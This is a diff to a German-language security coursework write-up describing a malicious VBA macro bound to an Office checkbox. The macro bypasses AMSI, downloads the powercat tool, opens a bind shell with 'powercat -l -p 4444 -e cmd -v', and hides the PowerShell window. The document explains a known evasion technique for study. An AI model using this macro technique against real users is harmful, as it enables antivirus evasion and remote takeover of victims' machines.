@@ -149,7 +149,8 @@ Dieses Script funktioniert bei aktuellem Patchstand (2022-02-28) noch immer:
 ![image](https://user-images.githubusercontent.com/173962/155933520-813cb214-af01-4e4f-90d5-cd07ef62120b.png)
 
 Nach dem Strippen von Kommentaren und Newlines sowie dem doppeltem Escapen
-(ergibt sich das folgende VBA Script, welches an die Checkbox gehängt wird:
+(einmal für `powershell -c` und einmal für VBA selbst),
+ergibt sich das folgende VBA Script, welches an die Checkbox gehängt wird:
 
 ```vba
 Private Sub CheckBox1_Click()
@@ -195,6 +196,18 @@ Private Sub CheckBox1_Click()
 
 End Sub
 ```
+
+* die Variable `amsi` beinhaltet das modifizierte Bypass-Script
+  * `&` konkatiniert Strings
+  * `vbNewline` wird verwendet um einen Multi-Line-String zu generieren
+  (was Powershell erwartet)
+  * `_` ist der Line-Continuation-Char
+* die Variable `code` beinhaltet zusätzlich noch:
+  * Nachladen von [powercat](https://github.com/besimorhino/powercat) (Powershell-basiertes netcat)
+  * das Starten einer Bind-Shell (`powercat -l -p 4444 -e cmd -v`)
+* das Nachladen und Ausführen von Code aus dem Internet ist 
+nach dem AMSI-Bypass tadellos möglich
+* `-windowstyle hidden` sorg dafür, dass das Powershell Fenster versteckt wird
 
 <!-- # Aufgabe 2, Egghunter (2P) -->
 
@@ -249,3 +262,4 @@ End Sub
 * https://github.com/bmedicke/REED
 * https://amsi.fail/
 * https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/
+* https://github.com/besimorhino/powercat
